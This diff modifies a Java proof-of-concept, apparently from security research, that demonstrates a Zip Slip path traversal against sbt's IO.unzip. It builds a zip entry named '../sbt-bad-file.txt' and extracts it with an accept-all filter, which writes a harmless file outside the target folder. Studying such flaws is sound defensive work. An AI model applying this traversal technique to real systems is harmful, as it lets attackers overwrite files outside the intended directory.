@@ -11,14 +11,16 @@ import java.util.zip.ZipOutputStream;
 public class SbtAttack {
 
     public static void main(String[] args) throws IOException {
-        String zipFileName = "sbt-exploit.zip";
+        String zipFileName = "exposed/sbt-exploit.zip";
         String fileNameInsideZip = "../sbt-bad-file.txt";
         createZip(zipFileName, fileNameInsideZip, "Some file content");
 
-        File destDir = new File("sbt-unzipped");
+        File destDir = new File("exposed/sbt-unzipped");
         destDir.mkdir();
 
         IO.unzip(new File(zipFileName), destDir, name -> true, false);
+
+        System.out.println("ZIP " + zipFileName + " was unzipped to " + destDir.getAbsolutePath());
     }
 
     private static void createZip(String zipFileName, String entryName, String fileContent) throws IOException {
@@ -28,6 +30,7 @@ public class SbtAttack {
             zipOut.putNextEntry(zipEntry);
             zipOut.write(fileContent.getBytes());
             zipOut.closeEntry();
+            System.out.println("ZIP " + zipFileName + " was created");
         }
     }
 }
